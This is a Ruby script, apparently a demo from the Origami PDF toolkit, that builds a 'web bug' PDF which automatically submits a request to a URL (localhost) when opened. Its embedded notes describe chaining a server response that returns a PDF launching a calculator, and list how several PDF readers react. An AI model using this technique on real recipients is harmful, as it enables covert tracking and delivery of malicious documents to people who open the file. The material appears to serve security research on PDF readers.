#!/usr/bin/ruby 

begin
  require 'origami'
rescue LoadError
  ORIGAMIDIR = "#{File.dirname(__FILE__)}/../../../lib"
  $: << ORIGAMIDIR
  require 'origami'
end
include Origami

OUTPUTFILE = "webbug-reader.pdf"

URL = "http://localhost/webbug-reader.php"

puts "Now generating a new bugged PDF file from scratch!"

pdf = PDF.new

contents = ContentStream.new
contents.write "webbug-reader.pdf",
  :x => 270, :y => 750, :rendering => Text::Rendering::STROKE, :size => 30

contents.write "When opened, this PDF connects to \"home\"",
  :x => 156, :y => 690, :rendering => Text::Rendering::FILL, :size => 15

contents.write "Click \"Allow\" to connect to #{URL} through your current Reader.",
  :x => 156, :y => 670, :size => 12


contents.write "Comments:",
  :x => 75, :y => 600, :rendering => Text::Rendering::FILL_AND_STROKE, :size => 14


content = <<-EOS
1. Open this pdf document (webbug-reader.pdf)
2. The Reader connects to ${url}
3. The web server returns the requested page:
      <?php
        header('Content-type: application/pdf');
        readfile('calc.pdf');
      ?>
4. The Reader receives \"calc.pdf\" which is immediatly rendered
5. A pop-up ask if it can execute the calc...

Note: The URL where the Reader tries to connect is displayed



Windows:
  - Foxit : Nothing happens.
  - Acrobat Reader 8: a popup appears for the user to allow the connection,
      then the connection is made and a new window is opened with the 2nd document

Mac:
  - Preview: nothing happens
  - Acrobat Reader 8: a popup appears for the user to allow the connection,
      then the connection is made and a new window is opened with the 2nd document

Linux:
  - poppler: /SubmitForm is not supported
  - Acrobat Reader 8: a popup appears for the user to allow the connection,
      then the connection is made and a the document window is replaced with the 2nd document
      Note: The 2 documents can be seen in the\"Window\" menu.
  - Acrobat Reader 8: a popup appears for the user to allow the connection,
      then the connection is made and a new window is opened with the 2nd document


EOS

contents.write content,
  :x => 75, :y => 580, :rendering => Text::Rendering::FILL, :size => 12

page = Page.new.setContents( contents )
pdf.append_page( page )

# Submit flags.
flags = Action::SubmitForm::Flags::EXPORTFORMAT|Action::SubmitForm::Flags::GETMETHOD

# Sends the form at the document opening.
pdf.onDocumentOpen Action::SubmitForm.new(URL, [], flags)

# Comments:
#  - any port can be specified http://url:1234
#  - does not follow the Redirect answers

# Save the resulting file.
pdf.save(OUTPUTFILE)

puts "PDF file saved as #{OUTPUTFILE}."
